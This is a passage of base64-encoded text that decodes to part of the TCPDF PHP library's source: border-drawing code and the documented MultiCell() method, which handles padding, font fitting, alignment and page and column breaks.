PSBmYWxzZSkpIHsgLy8gVEIKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBtICcsICR4VCwgJHlUKTsKCQkJCQkkcyAuPSBzcHJpbnRmKCclRiAlRiBsICcsICR4UiwgJHlSKTsKCQkJCQkkcyAuPSAnUyAnOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIG0gJywgJHhCLCAkeUIpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhMLCAkeUwpOwoJCQkJCSRzIC49ICdTICc7CgkJCQl9CgkJCX0gZWxzZSB7IC8vIHN0cmxlbigkYm9yZGVyKSA9PSAxCgkJCQlpZiAoc3RycG9zKCRib3JkZXIsJ0wnKSAhPT0gZmFsc2UpIHsgLy8gTAoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIG0gJywgJHhMLCAkeUwpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhULCAkeVQpOwoJCQkJCSRzIC49ICdTICc7CgkJCQl9IGVsc2VpZiAoc3RycG9zKCRib3JkZXIsJ1QnKSAhPT0gZmFsc2UpIHsgLy8gVAoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIG0gJywgJHhULCAkeVQpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhSLCAkeVIpOwoJCQkJCSRzIC49ICdTICc7CgkJCQl9IGVsc2VpZiAoc3RycG9zKCRib3JkZXIsJ1InKSAhPT0gZmFsc2UpIHsgLy8gUgoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIG0gJywgJHhSLCAkeVIpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhCLCAkeUIpOwoJCQkJCSRzIC49ICdTICc7CgkJCQl9IGVsc2VpZiAoc3RycG9zKCRib3JkZXIsJ0InKSAhPT0gZmFsc2UpIHsgLy8gQgoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIG0gJywgJHhCLCAkeUIpOwoJCQkJCSRzIC49IHNwcmludGYoJyVGICVGIGwgJywgJHhMLCAkeUwpOwoJCQkJCSRzIC49ICdTICc7CgkJCQl9CgkJCX0KCQkJaWYgKGlzX2FycmF5KCRzdHlsZSkgQU5EICFlbXB0eSgkc3R5bGUpKSB7CgkJCQkvLyByZXNldCBib3JkZXIgc3R5bGUgdG8gcHJldmlvdXMgdmFsdWUKCQkJCSRzIC49ICJcbiIuJHRoaXMtPmxpbmVzdHlsZVdpZHRoLicgJy4kdGhpcy0+bGluZXN0eWxlQ2FwLicgJy4kdGhpcy0+bGluZXN0eWxlSm9pbi4nICcuJHRoaXMtPmxpbmVzdHlsZURhc2guJyAnLiR0aGlzLT5EcmF3Q29sb3IuIlxuIjsKCQkJfQoJCX0KCQlyZXR1cm4gJHM7Cgl9CgoJLyoqCgkgKiBUaGlzIG1ldGhvZCBhbGxvd3MgcHJpbnRpbmcgdGV4dCB3aXRoIGxpbmUgYnJlYWtzLgoJICogVGhleSBjYW4gYmUgYXV0b21hdGljIChhcyBzb29uIGFzIHRoZSB0ZXh0IHJlYWNoZXMgdGhlIHJpZ2h0IGJvcmRlciBvZiB0aGUgY2VsbCkgb3IgZXhwbGljaXQgKHZpYSB0aGUgXG4gY2hhcmFjdGVyKS4gQXMgbWFueSBjZWxscyBhcyBuZWNlc3NhcnkgYXJlIG91dHB1dCwgb25lIGJlbG93IHRoZSBvdGhlci48YnIgLz4KCSAqIFRleHQgY2FuIGJlIGFsaWduZWQsIGNlbnRlcmVkIG9yIGp1c3RpZmllZC4gVGhlIGNlbGwgYmxvY2sgY2FuIGJlIGZyYW1lZCBhbmQgdGhlIGJhY2tncm91bmQgcGFpbnRlZC4KCSAqIEBwYXJhbSBmbG9hdCAkdyBXaWR0aCBvZiBjZWxscy4gSWYgMCwgdGhleSBleHRlbmQgdXAgdG8gdGhlIHJpZ2h0IG1hcmdpbiBvZiB0aGUgcGFnZS4KCSAqIEBwYXJhbSBmbG9hdCAkaCBDZWxsIG1pbmltdW0gaGVpZ2h0LiBUaGUgY2VsbCBleHRlbmRzIGF1dG9tYXRpY2FsbHkgaWYgbmVlZGVkLgoJICogQHBhcmFtIHN0cmluZyAkdHh0IFN0cmluZyB0byBwcmludAoJICogQHBhcmFtIG1peGVkICRib3JkZXIgSW5kaWNhdGVzIGlmIGJvcmRlcnMgbXVzdCBiZSBkcmF3biBhcm91bmQgdGhlIGNlbGwuIFRoZSB2YWx1ZSBjYW4gYmUgYSBudW1iZXI6PHVsPjxsaT4wOiBubyBib3JkZXIgKGRlZmF1bHQpPC9saT48bGk+MTogZnJhbWU8L2xpPjwvdWw+IG9yIGEgc3RyaW5nIGNvbnRhaW5pbmcgc29tZSBvciBhbGwgb2YgdGhlIGZvbGxvd2luZyBjaGFyYWN0ZXJzIChpbiBhbnkgb3JkZXIpOjx1bD48bGk+TDogbGVmdDwvbGk+PGxpPlQ6IHRvcDwvbGk+PGxpPlI6IHJpZ2h0PC9saT48bGk+QjogYm90dG9tPC9saT48L3VsPiBvciBhbiBhcnJheSBvZiBsaW5lIHN0eWxlcyBmb3IgZWFjaCBib3JkZXIgZ3JvdXAgLSBmb3IgZXhhbXBsZTogYXJyYXkoJ0xUUkInID0+IGFycmF5KCd3aWR0aCcgPT4gMiwgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoMCwgMCwgMCkpKQoJICogQHBhcmFtIHN0cmluZyAkYWxpZ24gQWxsb3dzIHRvIGNlbnRlciBvciBhbGlnbiB0aGUgdGV4dC4gUG9zc2libGUgdmFsdWVzIGFyZTo8dWw+PGxpPkwgb3IgZW1wdHkgc3RyaW5nOiBsZWZ0IGFsaWduPC9saT48bGk+QzogY2VudGVyPC9saT48bGk+UjogcmlnaHQgYWxpZ248L2xpPjxsaT5KOiBqdXN0aWZpY2F0aW9uIChkZWZhdWx0IHZhbHVlIHdoZW4gJGlzaHRtbD1mYWxzZSk8L2xpPjwvdWw+CgkgKiBAcGFyYW0gYm9vbGVhbiAkZmlsbCBJbmRpY2F0ZXMgaWYgdGhlIGNlbGwgYmFja2dyb3VuZCBtdXN0IGJlIHBhaW50ZWQgKHRydWUpIG9yIHRyYW5zcGFyZW50IChmYWxzZSkuCgkgKiBAcGFyYW0gaW50ICRsbiBJbmRpY2F0ZXMgd2hlcmUgdGhlIGN1cnJlbnQgcG9zaXRpb24gc2hvdWxkIGdvIGFmdGVyIHRoZSBjYWxsLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+MDogdG8gdGhlIHJpZ2h0PC9saT48bGk+MTogdG8gdGhlIGJlZ2lubmluZyBvZiB0aGUgbmV4dCBsaW5lIFtERUZBVUxUXTwvbGk+PGxpPjI6IGJlbG93PC9saT48L3VsPgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggeCBwb3NpdGlvbiBpbiB1c2VyIHVuaXRzCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeSB5IHBvc2l0aW9uIGluIHVzZXIgdW5pdHMKCSAqIEBwYXJhbSBib29sZWFuICRyZXNldGggaWYgdHJ1ZSByZXNldCB0aGUgbGFzdCBjZWxsIGhlaWdodCAoZGVmYXVsdCB0cnVlKS4KCSAqIEBwYXJhbSBpbnQgJHN0cmV0Y2ggZm9udCBzdHJldGNoIG1vZGU6IDx1bD48bGk+MCA9IGRpc2FibGVkPC9saT48bGk+MSA9IGhvcml6b250YWwgc2NhbGluZyBvbmx5IGlmIHRleHQgaXMgbGFyZ2VyIHRoYW4gY2VsbCB3aWR0aDwvbGk+PGxpPjIgPSBmb3JjZWQgaG9yaXpvbnRhbCBzY2FsaW5nIHRvIGZpdCBjZWxsIHdpZHRoPC9saT48bGk+MyA9IGNoYXJhY3RlciBzcGFjaW5nIG9ubHkgaWYgdGV4dCBpcyBsYXJnZXIgdGhhbiBjZWxsIHdpZHRoPC9saT48bGk+NCA9IGZvcmNlZCBjaGFyYWN0ZXIgc3BhY2luZyB0byBmaXQgY2VsbCB3aWR0aDwvbGk+PC91bD4gR2VuZXJhbCBmb250IHN0cmV0Y2hpbmcgYW5kIHNjYWxpbmcgdmFsdWVzIHdpbGwgYmUgcHJlc2VydmVkIHdoZW4gcG9zc2libGUuCgkgKiBAcGFyYW0gYm9vbGVhbiAkaXNodG1sIElOVEVSTkFMIFVTRSBPTkxZIC0tIHNldCB0byB0cnVlIGlmICR0eHQgaXMgSFRNTCBjb250ZW50IChkZWZhdWx0ID0gZmFsc2UpLiBOZXZlciBzZXQgdGhpcyBwYXJhbWV0ZXIgdG8gdHJ1ZSwgdXNlIGluc3RlYWQgd3JpdGVIVE1MQ2VsbCgpIG9yIHdyaXRlSFRNTCgpIG1ldGhvZHMuCgkgKiBAcGFyYW0gYm9vbGVhbiAkYXV0b3BhZGRpbmcgaWYgdHJ1ZSwgdXNlcyBpbnRlcm5hbCBwYWRkaW5nIGFuZCBhdXRvbWF0aWNhbGx5IGFkanVzdCBpdCB0byBhY2NvdW50IGZvciBsaW5lIHdpZHRoLgoJICogQHBhcmFtIGZsb2F0ICRtYXhoIG1heGltdW0gaGVpZ2h0LiBJdCBzaG91bGQgYmUgPj0gJGggYW5kIGxlc3MgdGhlbiByZW1haW5pbmcgc3BhY2UgdG8gdGhlIGJvdHRvbSBvZiB0aGUgcGFnZSwgb3IgMCBmb3IgZGlzYWJsZSB0aGlzIGZlYXR1cmUuIFRoaXMgZmVhdHVyZSB3b3JrcyBvbmx5IHdoZW4gJGlzaHRtbD1mYWxzZS4KCSAqIEBwYXJhbSBzdHJpbmcgJHZhbGlnbiBWZXJ0aWNhbCBhbGlnbm1lbnQgb2YgdGV4dCAocmVxdWlyZXMgJG1heGggPSAkaCA+IDApLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+VDogVE9QPC9saT48bGk+TTogbWlkZGxlPC9saT48bGk+QjogYm90dG9tPC9saT48L3VsPi4gVGhpcyBmZWF0dXJlIHdvcmtzIG9ubHkgd2hlbiAkaXNodG1sPWZhbHNlIGFuZCB0aGUgY2VsbCBtdXN0IGZpdCBpbiBhIHNpbmdsZSBwYWdlLgoJICogQHBhcmFtIGJvb2xlYW4gJGZpdGNlbGwgaWYgdHJ1ZSBhdHRlbXB0IHRvIGZpdCBhbGwgdGhlIHRleHQgd2l0aGluIHRoZSBjZWxsIGJ5IHJlZHVjaW5nIHRoZSBmb250IHNpemUgKGRvIG5vdCB3b3JrIGluIEhUTUwgbW9kZSkuICRtYXhoIG11c3QgYmUgZ3JlYXRlciB0aGFuIDAgYW5kIGVxdWFsIHRvICRoLgoJICogQHJldHVybiBpbnQgUmV0dXJuIHRoZSBudW1iZXIgb2YgY2VsbHMgb3IgMSBmb3IgaHRtbCBtb2RlLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuMwoJICogQHNlZSBTZXRGb250KCksIFNldERyYXdDb2xvcigpLCBTZXRGaWxsQ29sb3IoKSwgU2V0VGV4dENvbG9yKCksIFNldExpbmVXaWR0aCgpLCBDZWxsKCksIFdyaXRlKCksIFNldEF1dG9QYWdlQnJlYWsoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gTXVsdGlDZWxsKCR3LCAkaCwgJHR4dCwgJGJvcmRlcj0wLCAkYWxpZ249J0onLCAkZmlsbD1mYWxzZSwgJGxuPTEsICR4PW51bGwsICR5PW51bGwsICRyZXNldGg9dHJ1ZSwgJHN0cmV0Y2g9MCwgJGlzaHRtbD1mYWxzZSwgJGF1dG9wYWRkaW5nPXRydWUsICRtYXhoPTAsICR2YWxpZ249J1QnLCAkZml0Y2VsbD1mYWxzZSkgewoJCSRwcmV2X2NlbGxfbWFyZ2luID0gJHRoaXMtPmNlbGxfbWFyZ2luOwoJCSRwcmV2X2NlbGxfcGFkZGluZyA9ICR0aGlzLT5jZWxsX3BhZGRpbmc7CgkJLy8gYWRqdXN0IGludGVybmFsIHBhZGRpbmcKCQkkdGhpcy0+YWRqdXN0Q2VsbFBhZGRpbmcoJGJvcmRlcik7CgkJJG1jX3BhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nOwoJCSRtY19tYXJnaW4gPSAkdGhpcy0+Y2VsbF9tYXJnaW47CgkJJHRoaXMtPmNlbGxfcGFkZGluZ1snVCddID0gMDsKCQkkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10gPSAwOwoJCSR0aGlzLT5zZXRDZWxsTWFyZ2lucygwLCAwLCAwLCAwKTsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPmxhc3RoKSBPUiAkcmVzZXRoKSB7CgkJCS8vIHJlc2V0IHJvdyBoZWlnaHQKCQkJJHRoaXMtPnJlc2V0TGFzdEgoKTsKCQl9CgkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHRoaXMtPnNldFkoJHkpOyAvLyBzZXQgeSBpbiBvcmRlciB0byBjb252ZXJ0IG5lZ2F0aXZlIHkgdmFsdWVzIHRvIHBvc2l0aXZlIG9uZXMKCQl9CgkJJHkgPSAkdGhpcy0+R2V0WSgpOwoJCSRyZXN0aCA9IDA7CgkJaWYgKCgkaCA+IDApIEFORCAkdGhpcy0+aW5QYWdlQm9keSgpIEFORCAoKCR5ICsgJGggKyAkbWNfbWFyZ2luWydUJ10gKyAkbWNfbWFyZ2luWydCJ10pID4gJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIpKSB7CgkJCS8vIHNwaXQgY2VsbCBpbiBtb3JlIHBhZ2VzL2NvbHVtbnMKCQkJJG5ld2ggPSAoJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgLSAkeSk7CgkJCSRyZXN0aCA9ICgkaCAtICRuZXdoKTsgLy8gY2VsbCB0byBiZSBwcmludGVkIG9uIHRoZSBuZXh0IHBhZ2UvY29sdW1uCgkJCSRoID0gJG5ld2g7CgkJfQoJCS8vIGdldCBjdXJyZW50IHBhZ2UgbnVtYmVyCgkJJHN0YXJ0cGFnZSA9ICR0aGlzLT5wYWdlOwoJCS8vIGdldCBjdXJyZW50IGNvbHVtbgoJCSRzdGFydGNvbHVtbiA9ICR0aGlzLT5jdXJyZW50X2NvbHVtbjsKCQlpZiAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR4KSkgewoJCQkkdGhpcy0+c2V0WCgkeCk7CgkJfSBlbHNlIHsKCQkJJHggPSAkdGhpcy0+R2V0WCgpOwoJCX0KCQkvLyBjaGVjayBwYWdlIGZvciBuby13cml0ZSByZWdpb25zIGFuZCBhZGFwdCBwYWdlIG1hcmdpbnMgaWYgbmVjZXNzYXJ5CgkJbGlzdCgkeCwgJHkpID0gJHRoaXMtPmNoZWNrUGFnZVJlZ2lvbnMoMCwgJHgsICR5KTsKCQkvLyBhcHBseSBtYXJnaW5zCgkJJG95ID0gJHkgKyAkbWNfbWFyZ2luWydUJ107CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJG94ID0gKCR0aGlzLT53IC0gJHggLSAkbWNfbWFyZ2luWydSJ10pOwoJCX0gZWxzZSB7CgkJCSRveCA9ICgkeCArICRtY19tYXJnaW5bJ0wnXSk7CgkJfQoJCSR0aGlzLT54ID0gJG94OwoJCSR0aGlzLT55ID0gJG95OwoJCS8vIHNldCB3aWR0aAoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdykgT1IgKCR3IDw9IDApKSB7CgkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkkdyA9ICgkdGhpcy0+eCAtICR0aGlzLT5sTWFyZ2luIC0gJG1jX21hcmdpblsnTCddKTsKCQkJfSBlbHNlIHsKCQkJCSR3ID0gKCR0aGlzLT53IC0gJHRoaXMtPnggLSAkdGhpcy0+ck1hcmdpbiAtICRtY19tYXJnaW5bJ1InXSk7CgkJCX0KCQl9CgkJLy8gc3RvcmUgb3JpZ2luYWwgbWFyZ2luIHZhbHVlcwoJCSRsTWFyZ2luID0gJHRoaXMtPmxNYXJnaW47CgkJJHJNYXJnaW4gPSAkdGhpcy0+ck1hcmdpbjsKCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkkdGhpcy0+ck1hcmdpbiA9ICgkdGhpcy0+dyAtICR0aGlzLT54KTsKCQkJJHRoaXMtPmxNYXJnaW4gPSAoJHRoaXMtPnggLSAkdyk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPmxNYXJnaW4gPSAoJHRoaXMtPngpOwoJCQkkdGhpcy0+ck1hcmdpbiA9ICgkdGhpcy0+dyAtICR0aGlzLT54IC0gJHcpOwoJCX0KCQkkdGhpcy0+Y2xNYXJnaW4gPSAkdGhpcy0+bE1hcmdpbjsKCQkkdGhpcy0+Y3JNYXJnaW4gPSAkdGhpcy0+ck1hcmdpbjsKCQlpZiAoJGF1dG9wYWRkaW5nKSB7CgkJCS8vIGFkZCB0b3AgcGFkZGluZwoJCQkkdGhpcy0+eSArPSAkbWNfcGFkZGluZ1snVCddOwoJCX0KCQlpZiAoJGlzaHRtbCkgeyAvLyAqKioqKioqIFdyaXRlIEhUTUwgdGV4dAoJCQkkdGhpcy0+d3JpdGVIVE1MKCR0eHQsIHRydWUsIGZhbHNlLCAkcmVzZXRoLCB0cnVlLCAkYWxpZ24pOwoJCQkkbmwgPSAxOwoJCX0gZWxzZSB7IC8vICoqKioqKiogV3JpdGUgc2ltcGxlIHRleHQKCQkJJHByZXZfRm9udFNpemVQdCA9ICR0aGlzLT5Gb250U2l6ZVB0OwoJCQlpZiAoJGZpdGNlbGwpIHsKCQkJCS8vIGFqdXN0IGhlaWdodCB2YWx1ZXMKCQkJCSR0b2JvdHRvbSA9ICgkdGhpcy0+aCAtICR0aGlzLT55IC0gJHRoaXMtPmJNYXJnaW4gLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydUJ10gLSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10pOwoJCQkJJGggPSAkbWF4aCA9IG1heChtaW4oJGgsICR0b2JvdHRvbSksIG1pbigkbWF4aCwgJHRvYm90dG9tKSk7CgkJCX0KCQkJLy8gdmVydGljYWwgYWxpZ25tZW50CgkJCWlmICgkbWF4aCA+IDApIHsKCQkJCS8vIGdldCB0ZXh0IGhlaWdodAoJCQkJJHRleHRfaGVpZ2h0ID0gJHRoaXMtPmdldFN0cmluZ0hlaWdodCgkdywgJHR4dCwgJHJlc2V0aCwgJGF1dG9wYWRkaW5nLCAkbWNfcGFkZGluZywgJGJvcmRlcik7CgkJCQlpZiAoJGZpdGNlbGwgQU5EICgkdGV4dF9oZWlnaHQgPiAkbWF4aCkgQU5EICgkdGhpcy0+Rm9udFNpemVQdCA+IDEpKSB7CgkJCQkJLy8gdHJ5IHRvIHJlZHVjZSBmb250IHNpemUgdG8gZml0IHRleHQgb24gY2VsbCAodXNlIGEgcXVpY2sgc2VhcmNoIGFsZ29yaXRobSkKCQkJCQkkZm1pbiA9IDE7CgkJCQkJJGZtYXggPSAkdGhpcy0+Rm9udFNpemVQdDsKCQkJCQkkZGlmZl9lcHNpbG9uID0gKDEgLyAkdGhpcy0+ayk7IC8vIG9uZSBwb2ludCAobWluIHJlc29sdXRpb24pCgkJCQkJJG1heGl0ID0gKDIgKiBtaW4oMTAwLCBtYXgoMTAsIGludHZhbCgkZm1heCkpKSk7IC8vIG1heCBudW1iZXIgb2YgaXRlcmF0aW9ucwoJCQkJCXdoaWxlICgkbWF4aXQgPj0gMCkgewoJCQkJCQkkZm1pZCA9ICgoJGZtYXggKyAkZm1pbikgLyAyKTsKCQkJCQkJJHRoaXMtPnNldEZvbnRTaXplKCRmbWlkLCBmYWxzZSk7CgkJCQkJCSR0aGlzLT5yZXNldExhc3RIKCk7CgkJCQkJCSR0ZXh0X2hlaWdodCA9ICR0aGlzLT5nZXRTdHJpbmdIZWlnaHQoJHcsICR0eHQsICRyZXNldGgsICRhdXRvcGFkZGluZywgJG1jX3BhZGRpbmcsICRib3JkZXIpOwoJCQkJCQkkZGlmZiA9ICgkbWF4aCAtICR0ZXh0X2hlaWdodCk7CgkJCQkJCWlmICgkZGlmZiA+PSAwKSB7CgkJCQkJCQlpZiAoJGRpZmYgPD0gJGRpZmZfZXBzaWxvbikgewoJCQkJCQkJCWJyZWFrOwoJCQkJCQkJfQoJCQkJCQkJJGZtaW4gPSAkZm1pZDsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRmbWF4ID0gJGZtaWQ7CgkJCQkJCX0KCQkJCQkJLS0kbWF4aXQ7CgkJCQkJfQoJCQkJCWlmICgkbWF4aXQgPCAwKSB7CgkJCQkJCS8vIHByZW1hdHVyZSBleGl0LCB3ZSBnZXQgdGhlIG1pbmltdW0gZm9udCB2YWx1ZSB0byBmaXQgdGhlIGNlbGwKCQkJCQkJJHRoaXMtPnNldEZvbnRTaXplKCRmbWluKTsKCQkJCQkJJHRoaXMtPnJlc2V0TGFzdEgoKTsKCQkJCQkJJHRleHRfaGVpZ2h0ID0gJHRoaXMtPmdldFN0cmluZ0hlaWdodCgkdywgJHR4dCwgJHJlc2V0aCwgJGF1dG9wYWRkaW5nLCAkbWNfcGFkZGluZywgJGJvcmRlcik7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHRoaXMtPnNldEZvbnRTaXplKCRmbWlkKTsKCQkJCQkJJHRoaXMtPnJlc2V0TGFzdEgoKTsKCQkJCQl9CgkJCQl9CgkJCQlpZiAoJHRleHRfaGVpZ2h0IDwgJG1heGgpIHsKCQkJCQlpZiAoJHZhbGlnbiA9PSAnTScpIHsKCQkJCQkJLy8gdGV4dCB2ZXJ0aWNhbGx5IGNlbnRlcmVkCgkJCQkJCSR0aGlzLT55ICs9ICgoJG1heGggLSAkdGV4dF9oZWlnaHQpIC8gMik7CgkJCQkJfSBlbHNlaWYgKCR2YWxpZ24gPT0gJ0InKSB7CgkJCQkJCS8vIHRleHQgdmVydGljYWxseSBhbGlnbmVkIG9uIGJvdHRvbQoJCQkJCQkkdGhpcy0+eSArPSAoJG1heGggLSAkdGV4dF9oZWlnaHQpOwoJCQkJCX0KCQkJCX0KCQkJfQoJCQkkbmwgPSAkdGhpcy0+V3JpdGUoJHRoaXMtPmxhc3RoLCAkdHh0LCAnJywgMCwgJGFsaWduLCB0cnVlLCAkc3RyZXRjaCwgZmFsc2UsIHRydWUsICRtYXhoLCAwLCAkbWNfbWFyZ2luKTsKCQkJaWYgKCRmaXRjZWxsKSB7CgkJCQkvLyByZXN0b3JlIGZvbnQgc2l6ZQoJCQkJJHRoaXMtPnNldEZvbnRTaXplKCRwcmV2X0ZvbnRTaXplUHQpOwoJCQl9CgkJfQoJCWlmICgkYXV0b3BhZGRpbmcpIHsKCQkJLy8gYWRkIGJvdHRvbSBwYWRkaW5nCgkJCSR0aGlzLT55ICs9ICRtY19wYWRkaW5nWydCJ107CgkJfQoJCS8vIEdldCBlbmQtb2YtdGV4dCBZIHBvc2l0aW9uCgkJJGN1cnJlbnRZID0gJHRoaXMtPnk7CgkJLy8gZ2V0IGxhdGVzdCBwYWdlIG51bWJlcgoJCSRlbmRwYWdlID0gJHRoaXMtPnBhZ2U7CgkJaWYgKCRyZXN0aCA+IDApIHsKCQkJJHNraXAgPSAoJGVuZHBhZ2UgLSAkc3RhcnRwYWdlKTsKCQkJJHRtcHJlc3RoID0gJHJlc3RoOwoJCQl3aGlsZSAoJHRtcHJlc3RoID4gMCkgewoJCQkJaWYgKCRza2lwIDw9IDApIHsKCQkJCQkvLyBhZGQgYSBwYWdlIChvciB0cmlnIEFjY2VwdFBhZ2VCcmVhaygpIGZvciBtdWx0aWNvbHVtbiBtb2RlKQoJCQkJCSR0aGlzLT5jaGVja1BhZ2VCcmVhaygkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciArIDEpOwoJCQkJfQoJCQkJaWYgKCR0aGlzLT5udW1fY29sdW1ucyA+IDEpIHsKCQkJCQkkdG1wcmVzdGggLT0gKCR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbik7CgkJCQl9IGVsc2UgewoJCQkJCSR0bXByZXN0aCAtPSAoJHRoaXMtPmggLSAkdGhpcy0+dE1hcmdpbiAtICR0aGlzLT5iTWFyZ2luKTsKCQkJCX0KCQkJCS0tJHNraXA7CgkJCX0KCQkJJGN1cnJlbnRZID0gJHRoaXMtPnk7CgkJCSRlbmRwYWdlID0gJHRoaXMtPnBhZ2U7CgkJfQoJCS8vIGdldCBsYXRlc3QgY29sdW1uCgkJJGVuZGNvbHVtbiA9ICR0aGlzLT5jdXJyZW50X2NvbHVtbjsKCQlpZiAoJHRoaXMtPm51bV9jb2x1bW5zID09IDApIHsKCQkJJHRoaXMtPm51bV9jb2x1bW5zID0gMTsKCQl9CgkJLy8gZGlzYWJsZSBwYWdlIHJlZ2lvbnMgY2hlY2sKCQkkY2hlY2tfcGFnZV9yZWdpb25zID0gJHRoaXMtPmNoZWNrX3BhZ2VfcmVnaW9uczsKCQkkdGhpcy0+Y2hlY2tfcGFnZV9yZWdpb25zID0gZmFsc2U7CgkJLy8gZ2V0IGJvcmRlciBtb2RlcwoJCSRib3JkZXJfc3RhcnQgPSBUQ1BERl9TVEFUSUM6OmdldEJvcmRlck1vZGUoJGJvcmRlciwgJHBvc2l0aW9uPSdzdGFydCcsICR0aGlzLT5vcGVuY2VsbCk7CgkJJGJvcmRlcl9lbmQgPSBUQ1BERl9TVEFUSUM6OmdldEJvcmRlck1vZGUoJGJvcmRlciwgJHBvc2l0aW9uPSdlbmQnLCAkdGhpcy0+b3BlbmNlbGwpOwoJCSRib3JkZXJfbWlkZGxlID0gVENQREZfU1RBVElDOjpnZXRCb3JkZXJNb2RlKCRib3JkZXIsICRwb3NpdGlvbj0nbWlkZGxlJywgJHRoaXMtPm9wZW5jZWxsKTsKCQkvLyBkZXNpZ24gYm9yZGVycyBhcm91bmQgSFRNTCBjZWxscy4KCQlmb3IgKCRwYWdlID0gJHN0YXJ0cGFnZTsgJHBhZ2UgPD0gJGVuZHBhZ2U7ICsrJHBhZ2UpIHsgLy8gZm9yIGVhY2ggcGFnZQoJCQkkY2NvZGUgPSAnJzsKCQkJJHRoaXMtPnNldFBhZ2UoJHBhZ2UpOwoJCQlpZiAoJHRoaXMtPm51bV9jb2x1bW5zIDwgMikgewoJCQkJLy8gc2luZ2xlLWNvbHVtbiBtb2RlCgkJCQkkdGhpcy0+c2V0WCgkeCk7CgkJCQkkdGhpcy0+eSA9ICR0aGlzLT50TWFyZ2luOwoJCQl9CgkJCS8vIGFjY291bnQgZm9yIG1hcmdpbiBjaGFuZ2VzCgkJCWlmICgkcGFnZSA+ICRzdGFydHBhZ2UpIHsKCQkJCWlmICgoJHRoaXMtPnJ0bCkgQU5EICgkdGhpcy0+cGFnZWRpbVskcGFnZV1bJ29ybSddICE9ICR0aGlzLT5wYWdlZGltWyRzdGFydHBhZ2VdWydvcm0nXSkpIHsKCQkJCQkkdGhpcy0+eCAtPSAoJHRoaXMtPnBhZ2VkaW1bJHBhZ2VdWydvcm0nXSAtICR0aGlzLT5wYWdlZGltWyRzdGFydHBhZ2VdWydvcm0nXSk7CgkJCQl9IGVsc2VpZiAoKCEkdGhpcy0+cnRsKSBBTkQgKCR0aGlzLT5wYWdlZGltWyRwYWdlXVsnb2xtJ10gIT0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29sbSddKSkgewoJCQkJCSR0aGlzLT54ICs9ICgkdGhpcy0+cGFnZWRpbVskcGFnZV1bJ29sbSddIC0gJHRoaXMtPnBhZ2VkaW1bJHN0YXJ0cGFnZV1bJ29sbSddKTsKCQkJCX0KCQkJfQoJCQlpZiAoJHN0YXJ0cGFnZSA9PSAkZW5kcGFnZSkgewoJCQkJLy8gc2luZ2xlIHBhZ2UKCQkJCWZvciAoJGNvbHVtbiA9ICRzdGFydGNvbHVtbjsgJGNvbHVtbiA8PSAkZW5kY29sdW1uOyArKyRjb2x1bW4pIHsgLy8gZm9yIGVhY2ggY29sdW1uCgkJCQkJaWYgKCRjb2x1bW4gIT0gJHRoaXMtPmN1cnJlbnRfY29sdW1uKSB7CgkJCQkJCSR0aGlzLT5zZWxlY3RDb2x1bW4oJGNvbHVtbik7CgkJCQkJfQoJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCSR0aGlzLT54IC09ICRtY19tYXJnaW5bJ1InXTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhpcy0+eCArPSAkbWNfbWFyZ2luWydMJ107CgkJCQkJfQoJCQkJCWlmICgkc3RhcnRjb2x1bW4gPT0gJGVuZGNvbHVtbikgeyAvLyBzaW5nbGUgY29sdW1uCgkJCQkJCSRjYm9yZGVyID0gJGJvcmRlcjsKCQkJCQkJJGggPSBtYXgoJGgsICgkY3VycmVudFkgLSAkb3kpKTsKCQkJCQkJJHRoaXMtPnkgPSAkb3k7CgkJCQkJfSBlbHNlaWYgKCRjb2x1bW4gPT0gJHN0YXJ0Y29sdW1uKSB7IC8vIGZpcnN0IGNvbHVtbgoJCQkJCQkkY2JvcmRlciA9ICRib3JkZXJfc3RhcnQ7CgkJCQkJCSR0aGlzLT55ID0gJG95OwoJCQkJCQkkaCA9ICR0aGlzLT5oIC0gJHRoaXMtPnkgLSAkdGhpcy0+Yk1hcmdpbjsKCQkJCQl9IGVsc2VpZiAoJGNvbHVtbiA9PSAkZW5kY29sdW1uKSB7IC8vIGVuZCBjb2x1bW4KCQkJCQkJJGNib3JkZXIgPSAkYm9yZGVyX2VuZDsKCQkJCQkJJGggPSAk